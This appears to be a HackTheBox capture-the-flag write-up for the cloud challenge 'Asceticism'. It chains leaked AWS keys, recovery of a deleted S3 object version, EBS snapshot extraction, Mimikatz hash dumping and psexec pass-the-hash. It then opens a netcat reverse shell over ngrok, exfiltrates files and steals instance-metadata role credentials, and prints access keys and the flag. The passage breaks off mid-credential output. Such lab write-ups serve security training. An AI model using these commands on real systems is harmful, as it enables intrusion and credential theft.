![banner](Asceticism.assets/banner.png)



<img src="Asceticism.assets/htb.png" style="margin-left: 20px; zoom: 40%;" align=left />        <font size="10">Asceticism</font>

​	2<sup>nd</sup> May 2024 / Document No D24.102.69

​	Prepared By: felamos

​	Challenge Author(s): felamos

​	Difficulty: <font color=red>Insane</font>

​	Classification: Confidential

# Synopsis

Asceticism is an insane cloud challenge which showcases multiple aws services and blends in Windows exploitation with the cloud in unique and beautiful way. It makes clever use of KMS to show case how secure files can be decrypted with right permissions.

# Description
Upon thorough investigation, we have come across AWS Identity and Access Management (IAM) keys within a publicly accessible Git repository. Our initial suspicion is that these keys are associated with Vault11. However, we are seeking further clarification and confirmation on this matter. We kindly request your assistance in delving deeper into the situation to ascertain the precise ownership of these keys and to explore potential strategies for internally addressing any security vulnerabilities they may pose.

```
Access key ID,Secret access key, Region Name
AKIAXYAFLIG2DFBKVWHJ,AyOOKTDrBkaHCaaGuLKlD8VNlJvfp8T/f8k/D7+U, us-east-1
```

# Flag

```
HTB{W15D0M_15_5uFF3R1Ng_kA1_d3n_aGaP1_aF70}
```

# Solution

Given the provision of AWS credentials, including the specified region, it is advisable to leverage the 'aws configure' command to appropriately configure the tool for subsequent utilization. This method ensures that the tool is aligned with the designated AWS environment, thereby optimizing its functionality and facilitating seamless operations in future endeavors.

```
aws configure
AWS Access Key ID [****************6IKE]: AKIAXYAFLIG2DFBKVWHJ
AWS Secret Access Key [****************lRLE]: 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
Default region name []: us-east-1
Default output format [json]:
```

With the client successfully configured, we are poised to commence operations. However, our knowledge regarding the permissions associated with this particular account is limited. Hence, it becomes imperative to conduct a thorough enumeration of permissions. To facilitate this process, I intend to employ the 'enumerate-iam' tool, readily available on GitHub. This tool offers a comprehensive means of systematically cataloging and analyzing the permissions framework, enabling us to gain invaluable insights into the account's access privileges and restrictions.

```
git clone https://github.com/andresriancho/enumerate-iam
Cloning into 'enumerate-iam'...
remote: Enumerating objects: 56, done.
remote: Counting objects: 100% (26/26), done.
```

To proceed with the enumeration process, we will first clone the 'enumerate-iam' tool from its repository using a Git client. Subsequently, we will execute the tool utilising Python 3, wherein we will pass the access key and secret key as arguments. Optionally, we may also include the region parameter, although it is not mandatory for the tool's functionality. This approach ensures a systematic and controlled examination of the IAM permissions associated with the specified AWS account, enabling us to gather comprehensive insights into its access privileges and configurations.

```
python3 enumerate-iam.py --access-key AKIAXYAFLIG2DFBKVWHJ --secret-key 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
2024-05-07 15:53:34,271 - 9150 - [INFO] Starting permission enumeration for access-key-id "AKIAXYAFLIG2DFBKVWHJ"
2024-05-07 15:53:34,973 - 9150 - [INFO] -- Account ARN : arn:aws:iam::532587168180:user/kstone-dev
2024-05-07 15:53:34,974 - 9150 - [INFO] -- Account Id  : 532587168180
2024-05-07 15:53:34,975 - 9150 - [INFO] -- Account Path: user/kstone-dev
2024-05-07 15:53:35,067 - 9150 - [INFO] Attempting common-service describe / list brute force.
2024-05-07 15:53:40,263 - 9150 - [INFO] -- s3.list_buckets() worked!
```

The tool has provided valuable feedback indicating that we possess the capability to list S3 buckets. This revelation marks an auspicious starting point for our investigation. Consequently, we shall leverage the AWS CLI tool to execute a command that will enumerate and display all S3 buckets associated with the AWS account in question. This strategic maneuver allows us to gather crucial intelligence regarding the existing bucket infrastructure, thereby facilitating subsequent analysis and decision-making processes.

```
aws s3 ls
2024-05-07 14:07:20 vault11-reports
```

Upon conducting the listing of S3 buckets, our examination reveals the existence of a singular bucket named "vault11-reports" To further our investigation, it is imperative that we delve into the contents contained within this specific bucket. By doing so, we aim to uncover the nature and extent of the data housed within, thereby gaining valuable insights into the overall scope and purpose of this particular S3 repository. This deeper exploration will enable us to make informed decisions and take appropriate actions based on the findings unearthed within the confines of "vault11-reports".

```
aws s3 ls s3://vault11-reports
                           PRE flag/
```

Following the examination of the "vault11-reports" our scrutiny has unveiled the presence of a distinct folder labeled "flag." In order to further elucidate the contents housed within this directory, it becomes imperative to conduct a more granular investigation. By navigating into the "flag" folder, we aim to uncover any files or resources that may be stored within its confines. This meticulous exploration is pivotal in our quest to ascertain the nature and significance of the data encapsulated within the "flag" directory, thereby enabling us to glean valuable insights and make informed decisions based on the findings uncovered therein.
```
aws s3 ls s3://vault11-reports/flag/
2024-05-07 14:07:25         43 flag.txt
```

We have the flag, that was easy! Lets read the flag.

```
aws s3 cp s3://vault11-reports/flag/flag.txt .
download failed: s3://vault11-reports/flag/flag.txt to ./flag.txt An error occurred (AccessDenied) when calling the GetObject operation: User: arn:aws:iam::532587168180:user/kstone-dev is not authorized to perform: kms:Decrypt on resource: arn:aws:kms:us-east-1:532587168180:key/d24c4a28-7014-4d49-a6c2-c4f86a68945d because no identity-based policy allows the kms:Decrypt action
```

Encountering an intriguing error message stating our lack of permission to access a specific file prompts a deeper examination of the underlying encryption mechanisms employed within the S3 buckets. Given that AWS commonly utilizes managed keys for encryption purposes, the necessity of decryption becomes apparent in order to access the file in question. The absence of permission on the key suggests the utilization of a customer-managed key, further complicating the decryption process.

In light of these circumstances, with no additional content discernible within the bucket, our attention shifts towards exploring alternative avenues for potential access. Considering the possibility of versioning being enabled for the bucket, a viable strategy emerges: attempting to list versions of files within the bucket. To execute this strategy, we will leverage the AWS CLI with the 's3api' functionality. This methodical approach allows us to systematically explore the versioning status of files within the bucket, potentially uncovering additional insights or avenues for further investigation.

```
aws s3api list-object-versions --bucket vault11-reports
{
    "Versions": [
        {
            "ETag": "\"6b564bebe58e7e0248f75e7f29d0fa92\"",
            "Size": 43,
            "StorageClass": "STANDARD",
            <SNIP>
        {
            "ETag": "\"d6e420ebcdf3c9a7104b7f8a2e394749\"",
            "Size": 94,
            "StorageClass": "STANDARD",
            "Key": "snapper_accessKeys.csv",
            "VersionId": "O_Ybx9qvdhhJgdcuaeQNBXy9weknoyIi",
            "IsLatest": false,
            "LastModified": "2024-05-07T14:07:25.000Z",
            "Owner": {
                "DisplayName": "cloudchalls",
                "ID": "68fd0ca8813f6724859c6784d15f5d36a5dbb1965be025a4269b571ee1243500"
            }
        }
    ],
    <SNIP>
}
```

Following the enumeration process, our tool has unearthed a significant discovery: a file named "snapper_accessKeys.csv" that has been deleted from the bucket. However, amidst this deletion, the initial version, denoted as "O_Ybx9qvdhhJgdcuaeQNBXy9weknoyIi" remains preserved as a backup. Leveraging this crucial insight, our next course of action is to attempt the retrieval of this specific version of the file from the S3 bucket.

```
aws s3api get-object --bucket vault11-reports --key snapper_accessKeys.csv --version-id O_Ybx9qvdhhJgdcuaeQNBXy9weknoyIi snapper_accessKeys.csv
{
    "AcceptRanges": "bytes",
    "LastModified": "Tue, 07 May 2024 14:07:25 GMT",
    "ContentLength": 94,
    "ETag": "\"d6e420ebcdf3c9a7104b7f8a2e394749\"",
    "VersionId": "O_Ybx9qvdhhJgdcuaeQNBXy9weknoyIi",
    "ContentType": "application/octet-stream",
    "ServerSideEncryption": "AES256",
    "Metadata": {}
}
```

With the successful retrieval of the file "snapper_accessKeys.csv," it becomes evident that the encryption mechanism employed for this particular file differs from that of the previously encountered "flag" file. While the "flag" file was encrypted using customer-managed keys, the "snapper_accessKeys.csv" appears to have been encrypted using AWS-managed keys, facilitating its successful download.

```
cat snapper_accessKeys.csv
Access key ID,Secret access key
AKIAXYAFLIG2CSJQ4R5Y,BGTlUZBVjhdydUk9AMMG+X5b+1fzsvdstY8xVet6
```
Acknowledging the presence of another AWS IAM key, our next step entails configuring this key within the tool for seamless integration and functionality. While utilizing a profile for configuration is an option, for expediency, we will proceed with the standard configuration method.
```
aws configure
AWS Access Key ID [****************VWHJ]: AKIAXYAFLIG2CSJQ4R5Y
AWS Secret Access Key [****************D7+U]: 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
Default region name [None]:
Default output format [None]:
```

Now that we have successfully configured the tool with the newly provided AWS IAM key, our next course of action involves utilizing the enumeration tool once more to assess the permissions associated with this new IAM user.

```
python3 enumerate-iam.py --access-key AKIAXYAFLIG2CSJQ4R5Y --secret-key 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
2024-05-07 19:23:33,907 - 77093 - [INFO] Starting permission enumeration for access-key-id "AKIAXYAFLIG2CSJQ4R5Y"
2024-05-07 19:23:34,619 - 77093 - [INFO] -- Account ARN : arn:aws:iam::532587168180:user/snapper
2024-05-07 19:23:34,619 - 77093 - [INFO] -- Account Id  : 532587168180
2024-05-07 19:23:34,619 - 77093 - [INFO] -- Account Path: user/snapper
2024-05-07 19:23:34,713 - 77093 - [INFO] Attempting common-service describe / list brute force.
2024-05-07 19:23:35,247 - 77093 - [ERROR] Remove codedeploy.list_deployment_targets action
2024-05-07 19:23:35,804 - 77093 - [ERROR] Remove codedeploy.get_deployment_target action
2024-05-07 19:23:35,901 - 77093 - [ERROR] Remove codedeploy.batch_get_deployment_targets action
2024-05-07 19:33:18,734 - 77180 - [INFO] -- ec2.describe_instances() worked!
2024-05-07 19:23:38,570 - 77093 - [INFO] -- sts.get_session_token() worked!
2024-05-07 19:23:38,685 - 77093 - [INFO] -- sts.get_caller_identity() worked!
2024-05-07 19:23:45,002 - 77093 - [INFO] -- dynamodb.describe_endpoints() worked!
2024-05-07 19:24:24,328 - 77093 - [INFO] -- ec2.describe_snapshots() worked!
```

Following the execution of the enumeration tool, it has been revealed that the IAM user possesses the capability to list both instances and snapshots within the AWS environment. Building upon this insight, our next objective is to leverage this permission to retrieve a comprehensive listing of all snapshots associated with the AWS key.

```
aws ec2 describe-snapshots --region us-east-1
{
    "Snapshots": [
        {
            "Description": "hvm-ssd/ubuntu-trusty-amd64-server-20170202.1",
            "Encrypted": false,
            "OwnerId": "099720109477",
            "Progress": "100%",
            "SnapshotId": "snap-046281ab24d756c50",
            "StartTime": "2017-02-02T23:57:19.000Z",
            "State": "completed",
            "VolumeId": "vol-033ca269aeedb3521",
            "VolumeSize": 8,
            "OwnerAlias": "amazon",
            "StorageTier": "standard"
        },
        {
            "Description": "hvm/ubuntu-trusty-amd64-server-20170202.1",
            "Encrypted": false,
            "OwnerId": "099720109477",
            <SNIP>
```

In response to the command listing all snapshots, it appears that public snapshots are also included in the results. To refine the search and limit the scope to only snapshots associated with our account, we can employ the owner ID as a filter criterion.

```
aws sts get-caller-identity
{
    "UserId": "AIDAXYAFLIG2MDXEPN7XP",
    "Account": "532587168180",
    "Arn": "arn:aws:iam::532587168180:user/snapper"
}
```

Now that we have successfully obtained our account's owner ID through the AWS Security Token Service (STS) call, we possess the necessary identifier to filter snapshots based on ownership. Leveraging this owner ID, we can refine our snapshot listing process to exclusively retrieve snapshots associated with our AWS account.
```
aws ec2 describe-snapshots --filters Name=owner-id,Values=532587168180
{
    "Snapshots": [
        {
            "Description": "Windows Backup Drive Snapshot",
            "Encrypted": false,
            "OwnerId": "532587168180",
            "Progress": "100%",
            "SnapshotId": "snap-00197900d5ed8277e",
            "StartTime": "2024-05-07T15:11:58.748Z",
            "State": "completed",
            "VolumeId": "vol-075ee6a3f4c846e85",
            "VolumeSize": 1,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "Backup"
                }
            ],
            "StorageTier": "standard"
        }
        <SNIP>
    ]
}
```

Upon retrieving the listing of snapshots associated with our AWS account, we have identified three distinct snapshots, two of which are standard snapshots corresponding to virtual machine (VM) instances. However, one snapshot stands out due to its unique identifier as "backup."

Utilising the [dsnap](https://github.com/RhinoSecurityLabs/dsnap)  tool, we can initiate a listing operation to enumerate all available snapshots, including the "backup" snapshot. Subsequently, we can explore the contents of this snapshot and extract any relevant data or resources it may contain.


```
dsnap list
           Id          |   Owneer ID   | Description
snap-04d68f6296b5893de   532587168180   Created by CreateImage(i-0e5dabca0fa9f222f) for ami-041b49e5f82651d16
snap-09a2dac60106057d8   532587168180   Created by CreateImage(i-0e5dabca0fa9f222f) for ami-041b49e5f82651d16
snap-00197900d5ed8277e   532587168180   Windows Backup Drive Snapshot
```

Following the enumeration of snapshots, it is noted that one snapshot, denoted as "snap-00197900d5ed8277e," stands out as a Windows backup. To gain further context regarding this snapshot, we intend to inspect the running instances within our AWS environment.

```
aws ec2 describe-instances
{
    "Reservations": [
        {
            "Groups": [],
            "Instances": [
                {
                    "AmiLaunchIndex": 0,
                    "ImageId": "ami-0a62069ec7788c8be",
                    "InstanceId": "i-0e5dabca0fa9f222f",
                    "InstanceType": "t2.medium",
                    "KeyName": "felamos",
                    "LaunchTime": "2024-05-07T15:23:42.000Z",
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "Placement": {
                    <SNIP>
                                        "Platform": "windows",
                    "PrivateDnsName": "ip-172-31-93-160.ec2.internal",
                    "PrivateIpAddress": "172.31.93.160",
                    "ProductCodes": [],
                    "PublicDnsName": "ec2-54-208-244-117.compute-1.amazonaws.com",
                    "PublicIpAddress": "54.208.244.117",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    },
                    <SNIP>
                                        "BlockDeviceMappings": [
                        {
                            "DeviceName": "/dev/sda1",
                            "Ebs": {
                                "AttachTime": "2024-05-07T14:07:29.000Z",
                                "DeleteOnTermination": true,
                                "Status": "attached",
                                "VolumeId": "vol-0ed252fb0ff6d55cf"
                            }
                        },
                        {
                            "DeviceName": "/dev/xvdb",
                            "Ebs": {
                                "AttachTime": "2024-05-07T14:08:25.000Z",
                                "DeleteOnTermination": false,
                                "Status": "attached",
                                "VolumeId": "vol-075ee6a3f4c846e85"
                            }
                        }
                    ],
```

Certainly, an observation indicates the presence of two device names, delineating a filesystem partition and an extended one, presumably serving as a backup. Furthermore, pertinent details such as public IP and other relevant information have been identified, potentially proving useful for subsequent actions. Proceeding, it is advisable to retrieve the Windows backup snapshot and analyze its contents utilizing the dsnap tool.

```
dsnap get snap-00197900d5ed8277e
Selected snapshot with id snap-00197900d5ed8277e
Output Path: /root/snap-00197900d5ed8277e.img
Truncating file to 1.0 GB
Saved block 1131 of 1131
```

The analysis reveals that the partition size is 1 gigabyte, implying a potentially lengthy download process. Upon completion of the download, employing the file utility will enable us to ascertain the file's format and properties.

```
file snap-00197900d5ed8277e.img
snap-00197900d5ed8277e.img: DOS/MBR boot sector MS-MBR Windows 7 english at offset 0x163 "Invalid partition table" at offset 0x17b "Error loading operating system" at offset 0x19a "Missing operating system", disk signature 0x47565888; partition 1 : ID=0x7, start-CHS (0x0,2,3), end-CHS (0x81,254,63), startsector 128, 2091008 sectors
```

According to the file utility, the analyzed data is identified as a boot sector designed for Windows 7 in English, further indicating a missing operating system. This unequivocally signifies that it pertains to a Windows partition. To interact with this partition, utilizing guestfish would be appropriate, as detailed on [guestfish](https://libguestfs.org/guestfish.1.html).

```
guestfish -a snap-00197900d5ed8277e.img

Welcome to guestfish, the guest filesystem shell for
editing virtual machine filesystems and disk images.

Type: ‘help’ for help on commands
      ‘man’ to read the manual
      ‘quit’ to quit the shell

><fs> run
 100% ⟦▒▒▒▒▒▒▒▒<SNIP>▒▒▒▒▒▒▒▒▒▒▒▒⟧ 00:00
><fs> list-filesystems
/dev/sda1: ntfs
><fs> mount /dev/sda1 /
```

To proceed, we can integrate the disk into the tool and execute commands to list the available filesystems. Subsequently, we can mount the desired filesystem at the designated location (/) within the tool's environment. Upon completion, navigating to the root of the filesystem will allow us to examine its contents thoroughly.

```
><fs> ll /
total 8
drwxrwxrwx  1 0 0 4096 May  7 15:10 .
drwxr-xr-x 15 0 0 4096 May  7 19:39 ..
drwxrwxrwx  1 0 0    0 May  7 15:05 System Volume Information
drwxrwxrwx  1 0 0    0 May  7 15:10 WindowsImageBackup
```

As anticipated, the investigation confirms the presence of a Windows backup. Our next step involves exploring the contents within the `WindowsImageBackup` directory.

```
ll '/WindowsImageBackup'
total 4
drwxrwxrwx 1 0 0    0 May  7 15:10 .
drwxrwxrwx 1 0 0 4096 May  7 15:10 ..
drwxrwxrwx 1 0 0    0 May  7 15:11 EC2AMAZ-QLP7LVM
```

Within the directory, there is a subfolder, presumably denoting the Windows hostname.

```
><fs> ll '/WindowsImageBackup/EC2AMAZ-QLP7LVM'
total 5
drwxrwxrwx 1 0 0    0 May  7 15:11 .
drwxrwxrwx 1 0 0    0 May  7 15:10 ..
drwxrwxrwx 1 0 0 4096 May  7 15:11 Backup 2024-05-07 151007
drwxrwxrwx 1 0 0    0 May  7 15:10 Catalog
drwxrwxrwx 1 0 0    0 May  7 15:11 Logs
-rwxrwxrwx 1 0 0   16 May  7 15:10 MediaId
```

Within this directory lies another folder named after the backup date and time. We shall proceed by accessing its contents.

```
><fs> ll '/WindowsImageBackup/EC2AMAZ-QLP7LVM/Backup 2024-05-07 151007'
total 566384
drwxrwxrwx 1 0 0      4096 May  7 15:11 .
drwxrwxrwx 1 0 0         0 May  7 15:11 ..
-rwxrwxrwx 1 0 0 574619648 May  7 15:11 9546e6c7-0000-0000-0000-100000000000.vhdx
-rwxrwxrwx 1 0 0      1126 May  7 15:10 BackupSpecs.xml
-rwxrwxrwx 1 0 0       776 May  7 15:10 cbf50813-4594-4ba6-8266-c076ed7c396e_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
-rwxrwxrwx 1 0 0      4078 May  7 15:11 cbf50813-4594-4ba6-8266-c076ed7c396e_Components.xml
-rwxrwxrwx 1 0 0      4308 May  7 15:10 cbf50813-4594-4ba6-8266-c076ed7c396e_RegistryExcludes.xml
-rwxrwxrwx 1 0 0      3138 May  7 15:10 cbf50813-4594-4ba6-8266-c076ed7c396e_Writer0bada1de-01a9-4625-8278-69e735f39dd2.xml
<SNIP>
```

The backup folder appears to house a vhdx file, indicating it is a Virtual Hard Disk v2 for Hyper-V. Our next course of action involves copying this file into our designated folder for proper accessibility and analysis.

```
><fs> copy-out '/WindowsImageBackup/EC2AMAZ-QLP7LVM/Backup 2024-05-07 151007/9546e6c7-0000-0000-0000-100000000000.vhdx' /root/
 100% ⟦▒▒▒▒▒▒▒▒▒▒<SNIP>⟧ 00:00
><fs>
```

Upon successful copying of the vhdx file, we can utilize the file utility to determine its file type and characteristics.

```
file 9546e6c7-0000-0000-0000-100000000000.vhdx
9546e6c7-0000-0000-0000-100000000000.vhdx: Microsoft Disk Image eXtended, by Microsoft Windows 10.0.17763.0, sequence 0xa, NO Log Signature; region, 2 entries, id BAT, at 0x300000, Required 1, id Metadata, at 0x200000, Required 1
```

The file analysis indicates that it is identified as a Microsoft Disk image. To proceed, we will explore the feasibility of accessing it using guestfish, employing similar methods utilized with the snapshot image file.


```
guestfish -a 9546e6c7-0000-0000-0000-100000000000.vhdx

Welcome to guestfish, the guest filesystem shell for
editing virtual machine filesystems and disk images.

Type: ‘help’ for help on commands
      ‘man’ to read the manual
      ‘quit’ to quit the shell

><fs> run
 100% ⟦▒▒▒▒▒▒<SNIP>⟧ 00:00
><fs> list-filesystems
/dev/sda2: ntfs
><fs> mount /dev/sda2 /
```

This time, the disk is located at `sda2`. We will proceed by mounting it and then listing the root directory to inspect its contents.

```
><fs> ll /
total 16
drwxrwxrwx  1 0 0 4096 May  7 13:53 .
drwxr-xr-x 15 0 0 4096 May  7 19:49 ..
drwxrwxrwx  1 0 0 8192 Apr 10 04:12 Boot
drwxrwxrwx  1 0 0    0 Nov 14  2018 EFI
drwxrwxrwx  1 0 0    0 May  7 13:54 Windows
```

As anticipated, the directory appears to contain backed-up files. Let's verify the presence of files within directories such as EFI/boot and Windows to ensure the integrity of the backup.

```
><fs> ll /EFI/Boot
total 1436
drwxrwxrwx 1 0 0       0 Nov 14  2018 .
drwxrwxrwx 1 0 0       0 Nov 14  2018 ..
-rwxrwxrwx 1 0 0 1469752 Sep 15  2018 bootx64.efi

><fs> ll /Windows
total 4
drwxrwxrwx 1 0 0    0 May  7 13:54 .
drwxrwxrwx 1 0 0 4096 May  7 13:53 ..
drwxrwxrwx 1 0 0    0 May  7 15:05 System32
```

Given that the Windows folder typically corresponds to the `C:\` drive, it is imperative to delve deeper into its contents for further examination.

```
><fs> ll /Windows/System32/config
total 255852
drwxrwxrwx 1 0 0    49152 May  7 15:05 .
drwxrwxrwx 1 0 0        0 May  7 15:05 ..
-rwxrwxrwx 1 0 0    32768 May  7 13:55 BBI
-rwxrwxrwx 1 0 0        0 Sep 15  2018 BBI.LOG1
-rwxrwxrwx 1 0 0        0 Sep 15  2018 BBI.LOG2
-rwxrwxrwx 1 0 0    65536 Sep 15  2018 BBI{1c37910b-b8ad-11e8-aa21-e41d2d101530}.TM.blf
-rwxrwxrwx 1 0 0   524288 Sep 15  2018 BBI{1c37910b-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
-rwxrwxrwx 1 0 0   524288 Sep 15  2018 BBI{1c37910b-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
-rwxrwxrwx 1 0 0    28672 Nov 14  2018 BCD-Template
<SNIP>
-rwxrwxrwx 1 0 0    65536 May  7 13:57 SAM
<SNIP>
-rwxrwxrwx 1 0 0 17039360 May  7 13:57 SYSTEM
<SNIP>
```

Furthermore, within the Windows folder, we find the system32 and config directories, housing the SAM and SYSTEM files. These files contain NTLM hashes, which we can potentially extract for further analysis. Let's proceed by copying them into our designated directory for closer examination.

```
><fs> copy-out /Windows/System32/config/SAM /root
><fs> copy-out /Windows/System32/config/SYSTEM /root
```

Upon successful copying of the SAM and SYSTEM files, our next step involves utilizing samdump2 to extract the hash from these files for analysis.

```
samdump2 SYSTEM SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

It appears that an issue has arisen as the hash `31d6cfe0d16ae931b73c59d7e0c089c0` signifies a null hash, consistent across all accounts, which is abnormal behavior. This discrepancy suggests a potential malfunction either with the samdump tool or the extraction process via guestfish. Nevertheless, we can resort to using Mimikatz from within Windows to perform the hash dumping process. As a preliminary step, let's proceed by copying the disk file to a Windows environment.

![](Asceticism.assets/downloaded_vmdk.png)

Upon downloading the file, we can proceed by right-clicking on it and selecting the "Mount" option from the context menu.

![](Asceticism.assets/mount.png)

The attempt to mount the file may result in an error indicating it could not be mounted, necessitating manual intervention. In this case, we will need to assign a drive letter manually using Disk Management.

![](Asceticism.assets/diskmgr.png)

The newly mounted disk, highlighted in cyan, is displaying a size of 30 GB, which does not accurately reflect its true size.

![](Asceticism.assets/assignE.png)

After successfully assigning it a letter, in this instance, D, we can proceed by booting up Mimikatz and attempting to retrieve the hash from the mounted disk.

```
lsadump::sam /system:"D:\Windows\System32\config\SYSTEM" /sam:"D:\Windows\System32\config\SAM"
```

![](Asceticism.assets/mimikatz.png)

According to Mimikatz, the hash NTLM for the Administrator account is represented as `0b4781dad49c808c37bf3491dec3df91`, which does not resemble a null hash and appears to be correct. Given this, attempting to crack it would be an inefficient use of time. Instead, let's proceed by utilizing Impacket's psexec for further analysis.

```
python3 psexec.py -hashes :0b4781dad49c808c37bf3491dec3df91 Administrator@54.208.244.117
Impacket v0.12.0.dev1+20240507.102706.4e3e668a - Copyright 2023 Fortra

[*] Requesting shares on 54.208.244.117.....
[*] Found writable share ADMIN$
[*] Uploading file kLrvXuFS.exe
[*] Opening SVCManager on 54.208.244.117.....
[*] Creating service Vplo on 54.208.244.117.....
[*] Starting service Vplo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.5696]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```

With successful pass-the-hash authentication via psexec, we have acquired the NT System user privilege. However, obtaining a stable shell poses a challenge due to the unconventional nature of this environment. Instead of the traditional method of setting up a netcat listener, we will employ a tunneling service such as ngrok. Ngrok will facilitate the forwarding of our local traffic to one of its hosts, effectively acting as a proxy for establishing a stable connection.

https://dashboard.ngrok.com/get-started/setup/linux

Following the download, installation, and configuration of ngrok, our next step involves exposing port 8080 to establish connectivity.

```
ngrok tcp 8080
Session Status                online
Account                       <SNIP> (Plan: Free)
Version                       3.9.0
Region                        Europe (eu)
Latency                       16ms
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://6.tcp.eu.ngrok.io:17411 -> localhost:8080
```

Ngrok will provide a forwarding address, denoting the proxy location. Locally, we will initiate a listener on port 8080, then connect to ngrok at the specified port using netcat from the EC2 Windows machine.

```
nc -lvnp 8080
Listening on 0.0.0.0 8080
```

Given that we are operating on port 8080, we require the Windows version of netcat to be downloaded onto the machine. Since the machine has its own internet access, we can directly download the necessary files.

```
certutil.exe -urlcache -split -f https://github.com/int0x33/nc.exe/raw/master/nc64.exe nc.exe
****  Online  ****
  0000  ...
  b0d8
CertUtil: -URLCache command completed successfully.
```

Upon completion of the download, we can utilize the netcat tool to establish a connection to ngrok while simultaneously executing cmd.exe.

```
nc.exe 6.tcp.eu.ngrok.io 17411 -e cmd.exe
```

Once established, we can initiate the enumeration of the file system to inspect its contents. During this process, we will encounter `backup.ps1.enc`, which appears to be an encrypted file. To gain further insight into its nature, we need to transfer it to our system for analysis.

```
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7223-8A78

 Directory of C:\Users\Administrator\Desktop

05/07/2024  03:33 PM    <DIR>          .
05/07/2024  03:33 PM    <DIR>          ..
05/07/2024  03:31 PM             1,125 backup.ps1.enc
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
               3 File(s)          2,206 bytes
               2 Dir(s)  10,821,636,096 bytes free
```

Given the limitations of our connection system, we will opt to use netcat once again for transferring the file, as it offers a straightforward solution without requiring additional complexities.


```
nc -lvnp 8080 > backup.ps1.enc
Listening on 0.0.0.0 8080
```

We will maintain the same listening port and redirect the incoming data to a new file on our Linux system. Meanwhile, on the Windows machine, we will establish a connection to our ngrok service while simultaneously sending the desired file.
 
```
nc.exe -w 3 6.tcp.eu.ngrok.io 17411 < c:\users\Administrator\Desktop\backup.ps1.enc
```

After completing the transfer, we will wait for the process to return to our Linux system to verify the successful receipt of the file.

```
nc -lvnp 8080 > backup.ps1.enc
Listening on 0.0.0.0 8080
Connection received on 127.0.0.1 47278
```

Once the file is in our possession, it's imperative to ensure its integrity. We'll utilize certutil to verify the MD5 checksum of the file for accuracy.

```
C:\Users\Public> certUtil -hashfile c:\users\Administrator\Desktop\backup.ps1.enc MD5
MD5 hash of c:\users\Administrator\Desktop\backup.ps1.enc:
eff7bf51eedd39fe55e25fc434adbc2d
CertUtil: -hashfile command completed successfully.
```

On our Linux system, we'll perform a similar operation to validate the integrity of the received file using certutil to check its MD5 checksum.

```
md5sum backup.ps1.enc
eff7bf51eedd39fe55e25fc434adbc2d  backup.ps1.enc
```

With the MD5 checksum matching, we can confirm the integrity of the file. Now, we'll proceed to identify the file type by employing the file utility.

```
file backup.ps1.enc
backup.ps1.enc: Windows Precompiled iNF, version 2.1, flags 0xb1c49778, volatile dir ids, verified, digitally signed, at 0x77eaa816, at 0x10214 WinDirPath, LanguageID 862a, at 0xdf78648
```

The file utility indicates that the file is a `Windows Precompiled iNF` which may seem slightly misleading. However, for the time being, we'll set this observation aside and return to Windows to conduct further enumeration. Specifically, we'll focus on gathering metadata, a standard feature across all EC2 instances.

```
curl http://169.254.169.254/latest/meta-data/
<SNIP>
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
```

We'll utilize curl to retrieve metadata, specifically focusing on accessing the contents of the iam folder.

```
curl http://169.254.169.254/latest/meta-data/iam/
<SNIP>
info
security-credentials/
```

Naturally, the iam folder contains the security credentials folder and an info file. Our objective now is to retrieve the security key associated with the connected role's account.

```
C:\Users\Public>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/KMSRoleWin
<SNIP>
{
  "Code" : "Success",
  "LastUpdated" : "2024-05-08T11:04:55Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAXYAFLIG2MNAYNCIQ",
  "SecretAccessKey" : "tcjyvVvTU6wCpSy7o10BEBTIewfcKu1JRnRN4cSI",
